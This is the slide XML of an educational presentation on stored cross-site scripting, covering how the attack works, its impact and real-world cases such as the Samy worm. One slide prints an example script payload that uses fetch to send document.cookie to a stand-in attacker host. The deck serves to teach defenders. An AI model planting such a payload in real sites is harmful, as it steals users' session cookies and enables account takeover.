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Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
      <p:regular r:id="rId8"/>
      <p:bold r:id="rId9"/>
      <p:italic r:id="rId10"/>
      <p:boldItalic r:id="rId11"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Libre Baskerville" panose="020F0502020204030204" pitchFamily="2" charset="0"/>
      <p:regular r:id="rId12"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Open Sans" panose="020B060603050402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7408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Understanding Stored Cross-Site Scripting (Stored XSS)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7937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 critical web security threat that turns trusted websites into attack vectors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2115" y="1044893"/>
            <a:ext cx="5409724" cy="653772"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="403CCF"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What is Stored XSS?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="732115" y="2212181"/>
            <a:ext cx="8379381" cy="4748213"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9629418" y="2161580"/>
            <a:ext cx="4276368" cy="1607939"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Stored XSS is a dangerous web security vulnerability where malicious scripts are permanently saved on a target server—in databases, comment sections, or user profile fields.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9629418" y="3943112"/>
            <a:ext cx="4276368" cy="1929527"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>When victims access the infected content, the malicious script automatically executes in their browsers without any further attacker interaction. This persistent nature makes it significantly more dangerous than reflected XSS attacks.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9629418" y="6046232"/>
            <a:ext cx="4276368" cy="964763"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Impact:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Session hijacking, credential theft, unauthorized actions, and spreading malware across entire user bases.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59669" y="575429"/>
            <a:ext cx="11235095" cy="557451"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="403CCF"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>How Stored XSS Works: Practical Attack Example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1159669" y="1413510"/>
            <a:ext cx="12311063" cy="5317688"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4097408" y="5108154"/>
            <a:ext cx="1827971" cy="332930"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Store</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4097408" y="5535784"/>
            <a:ext cx="1827971" cy="713580"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Unsanitized script saved to the database</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791167" y="5346014"/>
            <a:ext cx="1827970" cy="332930"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="403CCF"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Execute</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791167" y="5773644"/>
            <a:ext cx="1827970" cy="475720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Script runs in victim's browser</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1756355" y="1893344"/>
            <a:ext cx="1827971" cy="332930"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Inject</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1756355" y="2320975"/>
            <a:ext cx="1827971" cy="713580"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker posts malicious script in comment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11062489" y="1893344"/>
            <a:ext cx="1827970" cy="332930"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exfiltrate</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11062489" y="2320975"/>
            <a:ext cx="1827970" cy="713580"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Session cookies sent to attacker server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6473418" y="1893344"/>
            <a:ext cx="1827971" cy="332930"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="403CCF"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Serve</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6473418" y="2320975"/>
            <a:ext cx="1827971" cy="475720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Victim loads the infected webpage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1159669" y="6889075"/>
            <a:ext cx="12311063" cy="765096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The attack exploits weak input validation. When a social media site fails to sanitize user comments, attackers inject JavaScript like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="EEEDF2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>&lt;script&gt;fetch('attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>. This malicious payload gets saved in the database and executes every time users view the page, silently stealing their session tokens and enabling full account takeover.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31094"/>
            <a:ext cx="8992314" cy="708779"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Real-World Stored XSS Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2293501"/>
            <a:ext cx="2411968" cy="1490663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="4067651"/>
            <a:ext cx="3340060"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MySpace Worm (2005)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="4558070"/>
            <a:ext cx="4158615" cy="217741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The infamous Samy worm exploited stored XSS to spread across over one million profiles in just 20 hours, automatically adding "Samy is my hero" to infected pages and creating history's fastest-spreading XSS attack.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 1" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5235893" y="2293501"/>
            <a:ext cx="2411968" cy="1490663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5235893" y="4067651"/>
            <a:ext cx="3805714"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Yahoo! Mail Breach (2024)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5235893" y="4558070"/>
            <a:ext cx="4158615" cy="2177415"/>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A critical stored XSS vulnerability in Yahoo's email platform allowed attackers to steal session cookies from millions of users, compromising accounts through malicious emails that executed scripts when opened.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 2" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9677995" y="2293501"/>
            <a:ext cx="2411968" cy="1490663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9677995" y="4067651"/>
            <a:ext cx="3350895" cy="354330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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CMS Platform Exploits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9677995" y="4558070"/>
            <a:ext cx="4158615" cy="2540318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
